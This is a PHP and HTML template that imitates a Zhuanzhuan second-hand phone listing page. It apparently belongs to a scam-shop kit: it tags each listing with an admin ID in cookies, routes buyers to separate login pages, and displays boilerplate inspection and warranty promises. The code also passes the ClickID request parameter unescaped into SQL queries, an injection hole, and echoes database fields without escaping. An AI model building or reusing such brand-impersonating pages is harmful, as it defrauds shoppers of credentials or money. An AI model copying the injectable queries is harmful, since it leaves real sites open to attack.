<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');


if($_GET['ClickID']){
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['ClickID']}' AND is_shelves=1");
	

	
	
	if($_GoodsID==0){
                echo "<script language=\"javascript\">
  document.location.href=\"http://m.zhuanzhuan.com\";
</script>";
                exit;
            }
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){

    }
}
	//判断访问记录是否存在，如果不存在则插入记录，条件更具当前ID和当前商品ID
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE gid='{$_GoodsID['goods_id']}'");
	if(!$_OID){
	    
		_query("
			INSERT INTO useraddress (
						
								titlea,
								type,
								class,
								gid,
								aid,
								state,
								utime
								) 
						VALUES (
							
						'{$_GoodsID['title']}',
								1,
								1,
								'{$_GoodsID['goods_id']}',
								'{$_GoodsID['in_admin_id']}',
								1,
								'{$_CURRENT_TIME}'
								)"
			);
		  
		  session_destroy();
	}
	

	
	//清楚最后传入的商品ID
	setcookie("GoodsID4");
	//写入商品对应管理员ID
	setcookie('ADMINUID',$_GoodsID['in_admin_id']);
	//将ID写入COOKIE，用于传值
	setcookie('GoodsID',$_GoodsID['goods_id']);
	//获取当前完整URL地址
	$INURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
	//将当前地址写入COOKIE,用于登录页面刷新而跳转返回
	setcookie('GoodsURL1_1',$INURL);
	//跳转地址
	if(!$_GoodsID){
		
	}
	//更新点击率	
	mysql_query("UPDATE goods SET hits = hits+1 WHERE goods_id = $_GET[ClickID]; ");
}else{
	
}

if($_GoodsID['oldnew']==1){
$oldnew888="全新";
$oldnew666="未激活，未使用过，全部功能正常，如下为真机实拍图";
        $oldnew555="none";
}
if($_GoodsID['oldnew']==2){
$oldnew888="99新";
$oldnew666="仅激活，未使用过，全部功能正常，如下为真机实拍图";
        
}
if($_GoodsID['oldnew']==3){
$oldnew888="98新";
$oldnew666="相当于新机仅使用一周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
        $oldnew555="none";
}
if($_GoodsID['oldnew']==4){
$oldnew888="95新";
$oldnew666="相当于新机仅使用二周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
    $oldnew555="none";
}
if($_GoodsID['oldnew']==5){
$oldnew888="88新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";}
if($_GoodsID['oldnew']==6){
$oldnew888="85新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";

}



if($_GoodsID['oldnewa']==1)
$oldnewa88="/detail1/dxdl.php?weixin";
if($_GoodsID['oldnewa']==2)
$oldnewa88="/detail1/wxdl.php?weixin";

if($_GoodsID['oldnewb']==3)
$oldnewb888="4G全网通";
if($_GoodsID['oldnewb']==4)
$oldnewb888="5G全网通";

if($_GoodsID['oldnewc']==1){
$oldnewc888="yue99();";
$oldnewc8888="block";}
if($_GoodsID['oldnewc']==2){
$oldnewc888="location.href='login.php?weixin=<?php echo md5($DOWNNa);?>'";
$oldnewc8888="none";}


if($_GoodsID['oldnewe']==1){
$oldnewe9999="none";
$oldnewe8888="";
$oldnewe7777="正通过平台保卖寄存在石家庄验机中心";
    
}
if($_GoodsID['oldnewe']==2){
$oldnewe9999="";
$oldnewe8888="none";
$oldnewe7777="支持验机";
}


if($_GoodsID['qcyanji']==1){
$qcyanji777="";
$qcyanji888="Android - 安卓系统 <i class='icon-android'></i>";}
if($_GoodsID['qcyanji']==2){
$qcyanji777="【苹果版】";
$qcyanji888="App Store - 苹果正版 <i class='icon-ios'></i>";}

?>
<!doctype html>
<html>

<head>
   <meta charset="utf-8">

   <style class="vjs-styles-defaults">
       .video-js {
           width: 300px;
           height: 100px;
       }

       .vjs-fluid {
           padding-top: 56.25%
       }
   </style>
   <meta data-n-head="ssr" name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1, maximum-scale=1, user-scalable=no">
   <meta data-n-head="ssr" data-hid="description" name="description" content="转转二手交易网">
   <title>【转转】<?php echo $oldnew888;?> <?php echo $_GoodsID['title']; ?></title>
   <link rel="stylesheet" href="css/style.css">
   <link rel="stylesheet" href="css/index.css">
   <link rel="stylesheet" href="css/add.css">
   <style data-vue-ssr-id="31743eaa:0 c094894e:0 8cfc964c:0 8cfc964c:1 76b498cc:0 622711aa:0 4a81a632:0 2d1eb9c2:0 3bf56e97:0 499ce1a2:0 cfdc0590:0 609dc680:0 3bc4cbbc:0 278b8846:0 f25e6b34:0 15bd097f:0 97edab8a:0 508b7dac:0 093783c7:0 0911351a:0 266f335c:0 17a04ba6:0 f3b8646c:0 1a16d382:0 00c37c6c:0 069e8405:0 3d1ae0fe:0">
   </style>


</head>

<body>
   <div id="__nuxt">
       <div id="__layout">
           <div class="">
               <div class="page-detail">
                   <!---->
                   <div class="nav-tab-wrap close" data-v-2ac4ccf0="">
                       <ul data-v-2ac4ccf0="" class="nav-tab">
                           <li data-v-2ac4ccf0="" num="1" class="active">
                               商品
                           </li>
                           <li data-v-2ac4ccf0="" num="2" class="">
                               验机报告
                           </li>
                           <li data-v-2ac4ccf0="" num="3" class="">
                                推荐
                            </li>
                        </ul>
                    </div>

                    <div id="tab-prod">
                        <!---->
                        <section zz-sectionid="104" class="banner-wrap" data-v-631ec3f2="">

                            <div class="banner-container" data-v-631ec3f2="" style="background-color: #e9e9e9;">

                                <div class="z-swipe" data-v-631ec3f2="">

                                    <div class="z-swipe__track" style="width: 100%; transition-duration: 0ms; transform: translateX(0px);">

                                        <div class="z-swipe-item" style="width: 100%; height: 100%; " data-v-631ec3f2="">
                                            <div data-v-631ec3f2=""><img zz-sortname="" zz-infoid="1442680054128313856" class="img-item tc-img" data-v-631ec3f2="" data-src="" src="<?php echo $_GoodsID['goods_img1'] ?>" lazy="loaded">

                                            </div>

                                        </div>

                                        <div class="z-swipe-item" style="width: 100%; height: 100%; " data-v-631ec3f2="">
                                            <div data-v-631ec3f2=""><img zz-sortname="" zz-infoid="1442680054128313856" class="img-item tc-img" data-v-631ec3f2="" data-src="" src="<?php echo $_GoodsID['goods_img2'] ?>" lazy="loaded">

                                            </div>

                                        </div>

                                        <div class="z-swipe-item" style="width: 100%; height: 100%; " data-v-631ec3f2="">
                                            <div data-v-631ec3f2=""><img zz-sortname="" zz-infoid="1442680054128313856" class="img-item tc-img" data-v-631ec3f2="" data-src="" src="<?php echo $_GoodsID['goods_img3'] ?>" lazy="loaded">

                                            </div>

                                        </div>

                                        <div class="z-swipe-item" style="width: 100%; height: 100%; " data-v-631ec3f2="">
                                            <div data-v-631ec3f2=""><img zz-sortname="" zz-infoid="1442680054128313856" class="img-item tc-img" data-v-631ec3f2="" data-src="" src="<?php echo $_GoodsID['goods_img4'] ?>" lazy="loaded">

                                            </div>

                                        </div>

                                        <div class="z-swipe-item" style="width: 100%; height: 100%; " data-v-631ec3f2="">
                                            <div data-v-631ec3f2=""><img zz-sortname="" zz-infoid="1442680054128313856" class="img-item tc-img" data-v-631ec3f2="" data-src="" src="<?php echo $_GoodsID['goods_img5'] ?>" lazy="loaded">

                                            </div>

                                        </div>



                                    </div>
                                </div>
                                <div id="count" class="custom-indicator" data-v-631ec3f2="">

                                </div>
                            </div>
                        </section>
                    </div>

                    <div class="good-tag" data-v-631ec3f2=""><img src="https://pic6.zhuanstatic.com/zhuanzh/a50325a8-a5b6-4813-bbfc-65092f6956be.png" class="good" data-v-631ec3f2="">
                        <img id="real" src="img/8bf01820-a4c3-412d-bee3-91f1f605b9e3.png" class="real" data-v-631ec3f2="" style="margin-left: 10px;">
                    </div>



                    <section zz-sectionid="105" class="product-base-info" data-v-77d6a2c0="">
                        <div class="guarantee-line" style="color:#b3704c;background:linear-gradient(90deg, #f8e3cb 0%, #e9c39d 100%);" data-v-77d6a2c0="">
                            <div class="guarantee-left" data-v-77d6a2c0=""><img src="img/one-title.d1434cb.png" data-v-77d6a2c0=""> <span class="line" style="background:linear-gradient(180deg,rgba(179, 112, 76, 0) 0%,#b3704c 51%,rgba(179, 112, 76, 0) 100%);" data-v-77d6a2c0=""></span>
                                <ul class="item" data-v-77d6a2c0="">
                                    <li data-v-77d6a2c0="">
                                        官方验机<span style="display:;" data-v-77d6a2c0="">·</span></li>
                                    <li data-v-77d6a2c0="">
                                        一年官方质保<span style="display:;" data-v-77d6a2c0="">·</span></li>
                                    <li data-v-77d6a2c0="">
                                        7天无理由<span style="display:none;" data-v-77d6a2c0="">·</span></li>
                                    <!---->
                                    <!---->
                                </ul>
                            </div> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAmCAMAAAD3EJukAAAAAXNSR0IArs4c6QAAAEhQTFRFAAAAtpJttnVQtHZRs3JRuHBMtHNQt3NNtHJOs3FOtHBNtXFNs3FNtHFNs3FNtHFMs3FNs3BNtHBMtHFNtHFMs3BNtHBNs3BMClCQSwAAABd0Uk5TAAcjKS8yMzxpbHR4h46RtbnGzObu8/q6Df8PAAAASklEQVQoz+3IyRGAIBBFwXHHFQX15Z+pAcy3irv2sc1eVNNai97g7HwfyB/Rv/xf8K3+5Hq4gez2Aghy589vL9d2uRblWpNysEIPxGYRBD2ATHsAAAAASUVORK5CYII=" class="guarantee-right" data-v-77d6a2c0="">
                        </div>

                        <!-- 弹窗加载 -->
                        <style>
                            .pop-wrapper .pop_close .closes[data-v-e6c591fa] {
                                width: 3.2vw;
                                height: 3.2vw;
                            }
                        </style>
                        <div class="z-overlay close" style="z-index: 2001; animation-duration: 0.3s;"></div>
                        <div data-v-e6c591fa="" data-v-77d6a2c0="" class="pop-wrapper z-popup z-popup--bottom close" style="z-index: 9999999;">
                            <div data-v-e6c591fa="" class="one-title"><img data-v-e6c591fa="" src="img/pop-title.a717358.png" class="title"> <span data-v-e6c591fa="">让你放心买、省心买</span>
                                <div data-v-e6c591fa="" class="pop_close"><img data-v-e6c591fa="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwBAMAAAClLOS0AAAAAXNSR0IArs4c6QAAACRQTFRFAAAAnJycm5ubm5ubm5ubmZmZmpqamZmZmpqamZmZmpqamZmZMwTB+AAAAAt0Uk5TAEhSVFlaW+Lj5Pyc7WPdAAAA2UlEQVQ4y5XUOxaCMBAF0CmUNbgFXYKVtZU1lbW7sLazpVOxYQF+sjkTxpj5PDhCEZhhbhJySIimX4uzzy2PsTm9dzZfda/YNqG1L+rwjO0qWDLvwpVvrQVcWhvyq7SkFGoi6jSRZfJZVclA91siM5MS2rnn2H1tTtRufTjjl+eb8oBzADBBoCcI9ASCRCAg2oZwQ/lZ6mpD/w8ex74f0OgR7CtAEiACJIH0b1rCABAGnmTgSAaWFGBIAZpIoIgEkmggyNDGGdxqa7Q5L2PbuUEHwGPsyJh6fQBSMamJ7F3qcAAAAABJRU5ErkJggg==" class="closes"></div>
                            </div>
                            <div data-v-e6c591fa="" class="guarantee-list">
                                <div data-v-e6c591fa="" class="guarantee-item"><img data-v-e6c591fa="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAAXNSR0IArs4c6QAAAK5QTFRFAAAA/////////8zM29u25syz38+/49XG4s7E5szE5tXE6dPF5dHE59DE59XE5dHH49DC5tDE4tLB48/D5NDE5dLD5tDC5tDG49HD5tHG5NDD5dHD4sy83sSy17ek17ei1bSf0KiRzqSMypuDxZFzvodou39fu4Beun5du31dun5cuXpXt3hWt3dTtnRQtXRQtXNPtHNQtXNPtHNPtHFPtXJOtHFOtHFNtHBMs3BMfQeqSgAAADl0Uk5TAAEEBQcKEBIaHh4jJysrMjY8PkBBREdHSEhMTVBWX2BibXN9kKa7vMDAwc/V3+zt7u/w8vP09fv8//KqpwAAAfZJREFUWMOtV+l6gjAQBO8DPFAUWU/UKrVaSz2a93+xKh6BHBhY52fIDF+yu5NdTZOgUDGalu24rmNbTaNS0FKhZHaAQccsqbJz9S4I0a3nFOh5YwBSDIz8C7pe7UMi+lU9iV9sw0u0i3J+uQcK6JVl/JoLSnBr4uM3QBkNwUXoLUiBFq/QgFRocOeHlGDuoeymFXBjsSj2IDV6kXzQ25ABbXqRVciE6rN++tkE+o/KMiAjjHv9D7IKDG7+UIfMqIcC3ewC3dD/AIGrT5qKe6frXeCPmUXzItBR489P5IJgynj1xf/V+Is/EmLNrBe0ihJ/Se7YMR8qSlk0XD34JOByqfmaP9o8+cRnvjU1i90+9vf72G1PtpQfsGGwNJvl/143HrznwmxH+bsZ+ztbc5gV/7b16MXCd8N2wh3P0Vgv25OYwuJM+ZuRwNmkAjeFJaWTj6HIGmVHCBUi4SNkKYyQw1/igSp8Ufp5IQ6xzYfROxIep7kkRyxBIgkU+PDRRBKkMqcgCB9NZVExMQqi8NFiEpZzTGE1TKiTgsRQIgrLpDrrSC3toSALX8TSJKbqHRLDFzFVma1PPn++/amCreMfFvTThn5c8c87usHAtzjoJgvf5uEbTXyri2+20e0+fuB4w8iDH7rwYx9+8HzD6PuG4Tvd+P8PeLZ0en9LM6sAAAAASUVORK5CYII=" class="item_check">
                                    <div data-v-e6c591fa="" class="item-title">
                                        <div data-v-e6c591fa="" class="title_txt">官方验机</div>
                                        <!---->
                                    </div>
                                    <div data-v-e6c591fa="" class="item-content">说明：从基础信息、外观成色、屏幕显示、设备功能等多方面进行检测，全方位检测每一部笔记本，让你放心买、省心买。
                                        注：平台仅对设备本身在当前验机环境下的外观、屏幕显示、功能、拆修浸液进行客观检测，其余内容不在检测内容范围内。</div>
                                </div>
                                <div data-v-e6c591fa="" class="guarantee-item"><img data-v-e6c591fa="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAAXNSR0IArs4c6QAAAK5QTFRFAAAA/////////8zM29u25syz38+/49XG4s7E5szE5tXE6dPF5dHE59DE59XE5dHH49DC5tDE4tLB48/D5NDE5dLD5tDC5tDG49HD5tHG5NDD5dHD4sy83sSy17ek17ei1bSf0KiRzqSMypuDxZFzvodou39fu4Beun5du31dun5cuXpXt3hWt3dTtnRQtXRQtXNPtHNQtXNPtHNPtHFPtXJOtHFOtHFNtHBMs3BMfQeqSgAAADl0Uk5TAAEEBQcKEBIaHh4jJysrMjY8PkBBREdHSEhMTVBWX2BibXN9kKa7vMDAwc/V3+zt7u/w8vP09fv8//KqpwAAAfZJREFUWMOtV+l6gjAQBO8DPFAUWU/UKrVaSz2a93+xKh6BHBhY52fIDF+yu5NdTZOgUDGalu24rmNbTaNS0FKhZHaAQccsqbJz9S4I0a3nFOh5YwBSDIz8C7pe7UMi+lU9iV9sw0u0i3J+uQcK6JVl/JoLSnBr4uM3QBkNwUXoLUiBFq/QgFRocOeHlGDuoeymFXBjsSj2IDV6kXzQ25ABbXqRVciE6rN++tkE+o/KMiAjjHv9D7IKDG7+UIfMqIcC3ewC3dD/AIGrT5qKe6frXeCPmUXzItBR489P5IJgynj1xf/V+Is/EmLNrBe0ihJ/Se7YMR8qSlk0XD34JOByqfmaP9o8+cRnvjU1i90+9vf72G1PtpQfsGGwNJvl/143HrznwmxH+bsZ+ztbc5gV/7b16MXCd8N2wh3P0Vgv25OYwuJM+ZuRwNmkAjeFJaWTj6HIGmVHCBUi4SNkKYyQw1/igSp8Ufp5IQ6xzYfROxIep7kkRyxBIgkU+PDRRBKkMqcgCB9NZVExMQqi8NFiEpZzTGE1TKiTgsRQIgrLpDrrSC3toSALX8TSJKbqHRLDFzFVma1PPn++/amCreMfFvTThn5c8c87usHAtzjoJgvf5uEbTXyri2+20e0+fuB4w8iDH7rwYx9+8HzD6PuG4Tvd+P8PeLZ0en9LM6sAAAAASUVORK5CYII=" class="item_check">
                                    <div data-v-e6c591fa="" class="item-title">
                                        <div data-v-e6c591fa="" class="title_txt">一年官方质保</div>
                                        <div data-v-e6c591fa="" class="title_more" onclick="location.href='https://m.zhuanzhuan.com/Mzhuanzhuan/zhuanzhuan/zzactivity/magic/6142bb009ca2d60066d0ee5e/index.html?webview=zzn&amp;metric=hxAwsSCb4hZWafbQjA1fWg192844xr&amp;needNewWebview=1';"><span data-v-e6c591fa="">了解详情</span><img data-v-e6c591fa="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAP1BMVEUAAACbm5uZmZmampqZmZmampqZmZmbm5uampqgoKCZmZmampqampqampqZmZmampqZmZmampqbm5ubm5uZmZkHEZ4HAAAAFHRSTlMAMOwy+u7OGE0S1mFW792rqnlFIYuvnHgAAABeSURBVDjL7dE5DoAwDERRO5DEEAjb3P+shI7OLqxISPz6VTP0mXLJOkqIbEAGxbGpwaJCXxV81eqpLk0JgEM7ugIjK2ZuRvqY6TGLYpKfgcUUZcTNYKgaDJ270N+7G7FfBgs6dT1AAAAAAElFTkSuQmCC" class="img_more"></div>
                                    </div>
                                    <div data-v-e6c591fa="" class="item-content">说明：自收货后起365日内，转转为您所购机器提供质保服务，保修期内出现非人为损坏的质量问题，转转提供免费维修服务。
                                        注：外观问题、电池损耗及收货后人为损坏无法质保。</div>
                                </div>
                                <div data-v-e6c591fa="" class="guarantee-item"><img data-v-e6c591fa="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAAXNSR0IArs4c6QAAAK5QTFRFAAAA/////////8zM29u25syz38+/49XG4s7E5szE5tXE6dPF5dHE59DE59XE5dHH49DC5tDE4tLB48/D5NDE5dLD5tDC5tDG49HD5tHG5NDD5dHD4sy83sSy17ek17ei1bSf0KiRzqSMypuDxZFzvodou39fu4Beun5du31dun5cuXpXt3hWt3dTtnRQtXRQtXNPtHNQtXNPtHNPtHFPtXJOtHFOtHFNtHBMs3BMfQeqSgAAADl0Uk5TAAEEBQcKEBIaHh4jJysrMjY8PkBBREdHSEhMTVBWX2BibXN9kKa7vMDAwc/V3+zt7u/w8vP09fv8//KqpwAAAfZJREFUWMOtV+l6gjAQBO8DPFAUWU/UKrVaSz2a93+xKh6BHBhY52fIDF+yu5NdTZOgUDGalu24rmNbTaNS0FKhZHaAQccsqbJz9S4I0a3nFOh5YwBSDIz8C7pe7UMi+lU9iV9sw0u0i3J+uQcK6JVl/JoLSnBr4uM3QBkNwUXoLUiBFq/QgFRocOeHlGDuoeymFXBjsSj2IDV6kXzQ25ABbXqRVciE6rN++tkE+o/KMiAjjHv9D7IKDG7+UIfMqIcC3ewC3dD/AIGrT5qKe6frXeCPmUXzItBR489P5IJgynj1xf/V+Is/EmLNrBe0ihJ/Se7YMR8qSlk0XD34JOByqfmaP9o8+cRnvjU1i90+9vf72G1PtpQfsGGwNJvl/143HrznwmxH+bsZ+ztbc5gV/7b16MXCd8N2wh3P0Vgv25OYwuJM+ZuRwNmkAjeFJaWTj6HIGmVHCBUi4SNkKYyQw1/igSp8Ufp5IQ6xzYfROxIep7kkRyxBIgkU+PDRRBKkMqcgCB9NZVExMQqi8NFiEpZzTGE1TKiTgsRQIgrLpDrrSC3toSALX8TSJKbqHRLDFzFVma1PPn++/amCreMfFvTThn5c8c87usHAtzjoJgvf5uEbTXyri2+20e0+fuB4w8iDH7rwYx9+8HzD6PuG4Tvd+P8PeLZ0en9LM6sAAAAASUVORK5CYII=" class="item_check">
                                    <div data-v-e6c591fa="" class="item-title">
                                        <div data-v-e6c591fa="" class="title_txt">7天无理由</div>
                                        <div data-v-e6c591fa="" class="title_more" onclick="location.href='https://m.zhuanzhuan.com/Mzhuanzhuan/zhuanzhuan/zzactivity/magic/6142b98bc26505007a547c85/index.html?webview=zzn&amp;metric=hxAwsSCb4hZWafbQjA1fWg192844xr&amp;needNewWebview=1';"><span data-v-e6c591fa="">了解详情</span><img data-v-e6c591fa="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAP1BMVEUAAACbm5uZmZmampqZmZmampqZmZmbm5uampqgoKCZmZmampqampqampqZmZmampqZmZmampqbm5ubm5uZmZkHEZ4HAAAAFHRSTlMAMOwy+u7OGE0S1mFW792rqnlFIYuvnHgAAABeSURBVDjL7dE5DoAwDERRO5DEEAjb3P+shI7OLqxISPz6VTP0mXLJOkqIbEAGxbGpwaJCXxV81eqpLk0JgEM7ugIjK2ZuRvqY6TGLYpKfgcUUZcTNYKgaDJ270N+7G7FfBgs6dT1AAAAAAElFTkSuQmCC" class="img_more"></div>
                                    </div>
                                    <div data-v-e6c591fa="" class="item-content">自收货后起7日内，提供无理由退货保障服务，让你退货无忧。
                                        注：出现包装破损、配件丢失、物品损坏等影响二次销售的情况下，均不支持7天无理由退换货。</div>
                                </div>
                                <div data-v-e6c591fa="" class="guarantee-item"><img data-v-e6c591fa="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAAXNSR0IArs4c6QAAAK5QTFRFAAAA/////////8zM29u25syz38+/49XG4s7E5szE5tXE6dPF5dHE59DE59XE5dHH49DC5tDE4tLB48/D5NDE5dLD5tDC5tDG49HD5tHG5NDD5dHD4sy83sSy17ek17ei1bSf0KiRzqSMypuDxZFzvodou39fu4Beun5du31dun5cuXpXt3hWt3dTtnRQtXRQtXNPtHNQtXNPtHNPtHFPtXJOtHFOtHFNtHBMs3BMfQeqSgAAADl0Uk5TAAEEBQcKEBIaHh4jJysrMjY8PkBBREdHSEhMTVBWX2BibXN9kKa7vMDAwc/V3+zt7u/w8vP09fv8//KqpwAAAfZJREFUWMOtV+l6gjAQBO8DPFAUWU/UKrVaSz2a93+xKh6BHBhY52fIDF+yu5NdTZOgUDGalu24rmNbTaNS0FKhZHaAQccsqbJz9S4I0a3nFOh5YwBSDIz8C7pe7UMi+lU9iV9sw0u0i3J+uQcK6JVl/JoLSnBr4uM3QBkNwUXoLUiBFq/QgFRocOeHlGDuoeymFXBjsSj2IDV6kXzQ25ABbXqRVciE6rN++tkE+o/KMiAjjHv9D7IKDG7+UIfMqIcC3ewC3dD/AIGrT5qKe6frXeCPmUXzItBR489P5IJgynj1xf/V+Is/EmLNrBe0ihJ/Se7YMR8qSlk0XD34JOByqfmaP9o8+cRnvjU1i90+9vf72G1PtpQfsGGwNJvl/143HrznwmxH+bsZ+ztbc5gV/7b16MXCd8N2wh3P0Vgv25OYwuJM+ZuRwNmkAjeFJaWTj6HIGmVHCBUi4SNkKYyQw1/igSp8Ufp5IQ6xzYfROxIep7kkRyxBIgkU+PDRRBKkMqcgCB9NZVExMQqi8NFiEpZzTGE1TKiTgsRQIgrLpDrrSC3toSALX8TSJKbqHRLDFzFVma1PPn++/amCreMfFvTThn5c8c87usHAtzjoJgvf5uEbTXyri2+20e0+fuB4w8iDH7rwYx9+8HzD6PuG4Tvd+P8PeLZ0en9LM6sAAAAASUVORK5CYII=" class="item_check">
                                    <div data-v-e6c591fa="" class="item-title">
                                        <div data-v-e6c591fa="" class="title_txt">24小时发货</div>
                                        <!---->
                                    </div>
                                    <div data-v-e6c591fa="" class="item-content">说明：发货时效有保证，下单后24小时内发货，包邮到家。</div>
                                </div>
                                <div data-v-e6c591fa="" class="guarantee-item"><img data-v-e6c591fa="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAAXNSR0IArs4c6QAAAK5QTFRFAAAA/////////8zM29u25syz38+/49XG4s7E5szE5tXE6dPF5dHE59DE59XE5dHH49DC5tDE4tLB48/D5NDE5dLD5tDC5tDG49HD5tHG5NDD5dHD4sy83sSy17ek17ei1bSf0KiRzqSMypuDxZFzvodou39fu4Beun5du31dun5cuXpXt3hWt3dTtnRQtXRQtXNPtHNQtXNPtHNPtHFPtXJOtHFOtHFNtHBMs3BMfQeqSgAAADl0Uk5TAAEEBQcKEBIaHh4jJysrMjY8PkBBREdHSEhMTVBWX2BibXN9kKa7vMDAwc/V3+zt7u/w8vP09fv8//KqpwAAAfZJREFUWMOtV+l6gjAQBO8DPFAUWU/UKrVaSz2a93+xKh6BHBhY52fIDF+yu5NdTZOgUDGalu24rmNbTaNS0FKhZHaAQccsqbJz9S4I0a3nFOh5YwBSDIz8C7pe7UMi+lU9iV9sw0u0i3J+uQcK6JVl/JoLSnBr4uM3QBkNwUXoLUiBFq/QgFRocOeHlGDuoeymFXBjsSj2IDV6kXzQ25ABbXqRVciE6rN++tkE+o/KMiAjjHv9D7IKDG7+UIfMqIcC3ewC3dD/AIGrT5qKe6frXeCPmUXzItBR489P5IJgynj1xf/V+Is/EmLNrBe0ihJ/Se7YMR8qSlk0XD34JOByqfmaP9o8+cRnvjU1i90+9vf72G1PtpQfsGGwNJvl/143HrznwmxH+bsZ+ztbc5gV/7b16MXCd8N2wh3P0Vgv25OYwuJM+ZuRwNmkAjeFJaWTj6HIGmVHCBUi4SNkKYyQw1/igSp8Ufp5IQ6xzYfROxIep7kkRyxBIgkU+PDRRBKkMqcgCB9NZVExMQqi8NFiEpZzTGE1TKiTgsRQIgrLpDrrSC3toSALX8TSJKbqHRLDFzFVma1PPn++/amCreMfFvTThn5c8c87usHAtzjoJgvf5uEbTXyri2+20e0+fuB4w8iDH7rwYx9+8HzD6PuG4Tvd+P8PeLZ0en9LM6sAAAAASUVORK5CYII=" class="item_check">
                                    <div data-v-e6c591fa="" class="item-title">
                                        <div data-v-e6c591fa="" class="title_txt">顺丰包邮</div>
                                        <!---->
                                    </div>
                                    <div data-v-e6c591fa="" class="item-content">说明：顺丰为你的商品保驾护航，让你安心收货。</div>
                                </div>
                            </div>
                        </div>

                        <div class="base" data-v-77d6a2c0="">
                            <div class="prod-title" data-v-77d6a2c0="">
                                <!---->

                                <?php echo $_GoodsID['title']; ?> 
                           </div>
                           <section data-v-1e9c0178="" class="qc-report" id="tab-qcreport"></section>
                           <div class="price-wrap" data-v-77d6a2c0="">
                               <div class="con" data-v-77d6a2c0="">
                                   <div class="cur" data-v-77d6a2c0=""><span class="unit" data-v-77d6a2c0="">¥</span> <span class="num" data-v-77d6a2c0=""><?php echo $_GoodsID['price']; ?></span></div>
                                   <div zz-sortname="券后到手价" zz-infoid="1442680054128313856" class="normal-handPrice-wrap" data-v-77d6a2c0=""><span class="text" data-v-77d6a2c0="">券后到手价</span> <span class="unit" data-v-77d6a2c0="">￥</span> <span class="price" data-v-77d6a2c0=""><?php echo $_GoodsID['qh']; ?></span></div>
                                   <!---->
                               </div>
                           </div>
                           <!---->
                           <!---->
                           <div data-v-77d6a2c0="" class="report-info">
                               <p data-v-77d6a2c0="" class="top-info">
                                   经平台检测：外观完好，功能完好
                               </p>
                               <div data-v-77d6a2c0="" class="bottom-info">
                                   <div data-v-77d6a2c0="" class="level-info">
                                       <p data-v-77d6a2c0="" class="level">
                                           等级<img data-v-77d6a2c0="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAMAAAC7IEhfAAAAAXNSR0IArs4c6QAAARpQTFRFAAAA////gICAVVVVQEBAMzMzKioqJCQkHBwcGhoaFRUVFBQUICAgGBgYFxcXFhYWExMTGBgYFhYWFBQUExMTEhISFhYWFRUVFBQUExMTEhISEhISERERFBQUFBQUExMTEhISEhISERERExMTEhISFBQUExMTExMTExMTEhISEhISERERExMTExMTEhISEhISEREREhISEhISEhISEhISEhISEhISEhISERERExMTEhISEhISEREREREREREREhISEhISEREREhISEhISEREREREREhISEhISEhISEREREhISEhISEREREhISEhISEREREREREREREREREhISEhISEhISEhISEhISERERERERERERERERERERERERzfghYAAAAF10Uk5TAAECAwQFBgcJCgwNEBUWFxsgIyYpKy8xMzY4OjtAQURFSEpSV1tdXl9iZWlqbG9ydn5/gIKDi4+Ul5+goqOlqq6wt7q/wcTFyszT2d3o6evs7u/x8vP09vj5/P3+0uqUagAAAeFJREFUOMuNlWt7k0AQhU9t1EgstlCvFRpbLd5SKtJ6S0iqFC0YLUnXS+T8/7/hhyDLEnhkPg3vM3uZszMDoJjhBmEiRBIGroFG0/2YJYt9vTZM8wSZjhzL1Hqm5YxSUnjaatz+lJzYHQk69oSc7lfC1ryM0U518U7EzFsrk+6Yi8O6+xwuOO6W9htz1q9PsD/jWO7pcbbdJMX2jF6RR7boN4vWX2R5RtqUpftt+F8u5ufBw9I9OdXygyNJ9+ZLtbMP1woWLQ/XBaUu5m9eHO3ee3JOnkiVKHQAx5zIDT/x6xYArJ8yu1PQCX0AMe2C3CcfL70t8mWBbcaAwVS+23P+upK73/lOvmZKAy6H8uQ3TP653/hW8iFdBDyQ4JaxmXt3yYHkDgOEtGpUvv6ZPzbkp8UQCc3VuBsfyaPSt8kEgqvFqUXkKwVQ4JK9atzVkH9eKKTHy7qjX5OOSkwmNcl052XFimSC6mrskg8qyGGgCg4AeErerKARXfUJAQC3B4N1lXRSGmpRNJjNGIBfLjMA0J49qgQuy0wpXAA4I1UV88JVWwHAT/K9AvJWqDQXcEKh3LporpV23ezVt2v7AdB+pLQeUu3HXvtBWozm4YFlapppOcOm0QxAP2417P/z+/gLU4p1os7Hkh8AAAAASUVORK5CYII=">
                                       </p>
                                       <p data-v-77d6a2c0="" class="condition">

                                           <!-- 等级渲染 -->
                                      <?php echo $oldnew888;?> </p>
                                   </div>
                       <div data-v-77d6a2c0="" class="report-param">
                           <div data-v-77d6a2c0="" class="report-item">
                               <p data-v-77d6a2c0="">网络制式</p>
